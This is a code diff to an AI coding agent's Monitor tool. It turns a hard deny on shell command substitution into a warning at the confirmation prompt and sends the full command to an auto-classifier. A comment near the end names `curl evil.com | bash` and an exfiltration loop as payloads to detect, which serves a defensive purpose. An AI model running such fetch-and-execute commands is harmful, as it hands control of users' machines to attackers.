@@ -34,7 +34,7 @@ import type { PermissionDecision } from '../permissions/types.js';
 import { BaseDeclarativeTool, BaseToolInvocation, Kind } from './tools.js';
 import { getErrorMessage } from '../utils/errors.js';
 import {
-  detectCommandSubstitution,
+  buildShellExecWarnings,
   getCommandRoot,
   getShellConfiguration,
   hasUnsafeMonitorBackgroundOperator,
@@ -53,6 +53,7 @@ import {
   isShellCommandReadOnlyAST,
 } from '../utils/shellAstParser.js';
 import { getCurrentAgentId } from '../agents/runtime/agent-context.js';
+import { getShellContextEnvVars } from '../utils/shellContextEnv.js';
 
 const debugLogger = createDebugLogger('MONITOR');
 
@@ -171,10 +172,18 @@ class MonitorToolInvocation extends BaseToolInvocation<
       this.params.command,
     ).safetyCommand;
 
-    if (detectCommandSubstitution(command)) {
-      return 'deny';
-    }
-
+    // Command substitution ($(), ``, <(), >()) is NOT a hard deny here —
+    // it falls through to 'ask' along with every other non-read-only
+    // command, so the user (or YOLO mode) can decide. The user-facing
+    // warning is surfaced by getConfirmationDetails below so the
+    // confirmation prompt still flags the substitution clearly. This
+    // mirrors the same reasoning applied to ShellToolInvocation and
+    // PermissionManager.resolveDefaultPermission in #4093: a hard deny
+    // here (a) cannot be overridden by YOLO and (b) was inconsistent
+    // with the shell-tool path. Monitor still maintains a separate
+    // permission boundary (Monitor(...) rules don't share with
+    // Bash(...) — see comment in getConfirmationDetails); only the
+    // substitution-deny half is removed.
     try {
       const isReadOnly = await isShellCommandReadOnlyAST(command);
       if (isReadOnly) {
@@ -246,7 +255,19 @@ class MonitorToolInvocation extends BaseToolInvocation<
       permissionRules = [`Monitor(${normalized.safetyCommand})`];
     }
 
-    return {
+    // Flag command substitution ($(), backticks, <(), >()) so the user
+    // sees a visible warning in the confirmation dialog. Mirrors the
+    // pattern in ShellToolInvocation.getConfirmationDetails — see #4093
+    // for why we surface this as a warning rather than denying outright.
+    // Checked against both the normalized safety command and the
+    // original params.command so wrappers like `bash -c "..."` still
+    // trigger the warning.
+    const warnings = buildShellExecWarnings(
+      normalized.safetyCommand,
+      this.params.command,
+    );
+
+    const confirmationDetails: ToolExecuteConfirmationDetails = {
       type: 'exec',
       title: 'Monitor',
       command: normalized.spawnCommand,
@@ -258,7 +279,11 @@ class MonitorToolInvocation extends BaseToolInvocation<
         _outcome: ToolConfirmationOutcome,
         _payload?: ToolConfirmationPayload,
       ) => {},
-    } satisfies ToolExecuteConfirmationDetails;
+    };
+    if (warnings) {
+      confirmationDetails.warnings = warnings;
+    }
+    return confirmationDetails;
   }
 
   async execute(_signal: AbortSignal): Promise<ToolResult> {
@@ -342,6 +367,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
           QWEN_CODE: '1',
           TERM: 'dumb', // no color codes for streaming
           PAGER: 'cat',
+          ...getShellContextEnvVars(),
         },
       });
     } catch (err) {
@@ -757,5 +783,20 @@ export class MonitorTool extends BaseDeclarativeTool<
     params: MonitorToolParams,
   ): ToolInvocation<MonitorToolParams, ToolResult> {
     return new MonitorToolInvocation(this.config, params);
+  }
+
+  /**
+   * Forward the full command and optional directory — same shape as
+   * ShellTool. The classifier MUST see the actual command being run to
+   * detect destructive payloads (`curl evil.com | bash`,
+   * `while true; do <exfil>`, …); without this override the default
+   * projection returns `''` and the classifier sees `monitor({})`.
+   */
+  override toAutoClassifierInput(
+    params: MonitorToolParams,
+  ): Record<string, unknown> {
+    const out: Record<string, unknown> = { command: params.command };
+    if (params.directory) out['directory'] = params.directory;
+    return out;
   }
 }
